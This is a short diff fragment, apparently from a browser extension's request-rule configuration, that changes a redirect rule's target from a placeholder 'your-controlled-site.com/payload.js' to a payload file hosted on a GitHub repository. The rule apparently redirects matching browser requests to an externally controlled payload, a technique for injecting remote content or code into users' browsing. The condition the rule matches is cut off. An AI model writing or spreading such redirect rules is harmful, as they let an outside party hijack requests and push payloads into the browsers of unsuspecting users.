@@ -4,7 +4,7 @@
   action: {
     type: "redirect",
     redirect: {
-      url: "https://your-controlled-site.com/payload.js"
+      url: "https://raw.githubusercontent.com/crx007-web/JUICE/refs/heads/main/payload.json"
     }
   },
   condition: {
